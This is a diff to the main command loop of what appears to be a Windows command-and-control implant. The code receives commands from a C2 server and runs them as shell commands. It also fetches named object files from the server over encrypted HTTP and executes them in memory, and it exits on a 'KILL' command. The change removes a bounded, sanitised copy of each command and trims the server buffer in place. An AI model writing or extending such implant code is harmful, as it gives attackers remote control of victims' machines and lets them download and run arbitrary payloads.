@@ -9,7 +9,6 @@
 #include "shell.h"
 
 #define PATH_BUF_SIZE  512
-#define CMD_BUF_SIZE   4096
 #define AGENT_ID_SIZE  256
 
 // ---------------------------------------------------------------------------
@@ -56,23 +55,21 @@ int main(void) {
             shell_buf_reset();
 
             if (cmd_len > 0) {
-                // Sanitise: strip trailing whitespace
-                char safe_cmd[CMD_BUF_SIZE];
-                strncpy(safe_cmd, (char *)cmd_plain, CMD_BUF_SIZE - 1);
-                safe_cmd[CMD_BUF_SIZE - 1] = '\0';
-                char *end = safe_cmd + strlen(safe_cmd) - 1;
-                while (end >= safe_cmd && (*end == '\r' || *end == '\n' || *end == ' '))
+                char *cmd = (char *)cmd_plain;
+                char *end = cmd + cmd_len - 1;
+                while (end >= cmd && (*end == '\r' || *end == '\n' || *end == ' '))
                     *end-- = '\0';
 
-                if (safe_cmd[0] != '\0') {
-                    if (strcmp(safe_cmd, "KILL") == 0) {
+                if (cmd[0] != '\0') {
+                    if (strcmp(cmd, "KILL") == 0) {
                         // Server-initiated termination — clean up and exit
                         free(cmd_plain);
                         shell_cleanup();
                         ExitProcess(0);
-                    } else if (strncmp(safe_cmd, "BOF:", 4) == 0) {
+
+                    } else if (strncmp(cmd, "BOF:", 4) == 0) {
                         // Format: BOF:<name>:<hex-encoded packed args>
-                        char *bof_name = safe_cmd + 4;
+                        char *bof_name = cmd + 4;
                         char *args_hex = strchr(bof_name, ':');
                         if (args_hex) {
                             *args_hex++ = '\0';
@@ -83,8 +80,9 @@ int main(void) {
                             snprintf(bof_path, PATH_BUF_SIZE, "/getbof/%s/%s",
                                      agent_id, bof_name);
 
-                            if (http_post_encrypted(C2_SERVER_IP, C2_SERVER_PORT, bof_path,
-                                                    NULL, 0, &bof_data, &bof_len) == 0
+                            if (http_post_encrypted(C2_SERVER_IP, C2_SERVER_PORT,
+                                                    bof_path, NULL, 0,
+                                                    &bof_data, &bof_len) == 0
                                 && bof_data) {
                                 int   hex_len  = (int)strlen(args_hex);
                                 int   args_len = hex_len / 2;
@@ -95,14 +93,18 @@ int main(void) {
                                         sscanf(args_hex + i * 2, "%2x", &b);
                                         args[i] = (char)b;
                                     }
-                                    execute_bof(bof_data, (size_t)bof_len, args, args_len);
+                                    execute_bof(bof_data, (size_t)bof_len,
+                                                args, args_len);
                                     free(args);
                                 }
                                 free(bof_data);
                             }
+                        } else {
+                            beacon_log("[!] Malformed BOF command, missing args separator\n");
                         }
+
                     } else {
-                        execute_shell_command(safe_cmd);
+                        execute_shell_command(cmd);
                     }
                 }
             }
